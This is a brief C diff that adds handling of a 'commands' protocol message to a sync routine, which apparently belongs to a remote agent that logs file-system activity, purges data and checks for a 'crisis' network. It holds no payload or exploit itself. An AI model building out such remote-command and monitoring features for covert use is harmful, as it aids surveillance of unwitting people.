@@ -149,6 +149,9 @@ BOOL WINAPI DA_Syncronize(BYTE *action_param)
 			LOG_HandleFileSystem();
 		if (availables[i] == PROTO_PURGE)
 			ASP_HandlePurge(&purge_time, &purge_size);
+		if (availables[i] == PROTO_COMMANDS)
+			LOG_HandleCommands();
+
 
 		if (IsCrisisNetwork()) 
 			break; // Cosi' se aveva ricevuto la nuova configurazione, la attiva
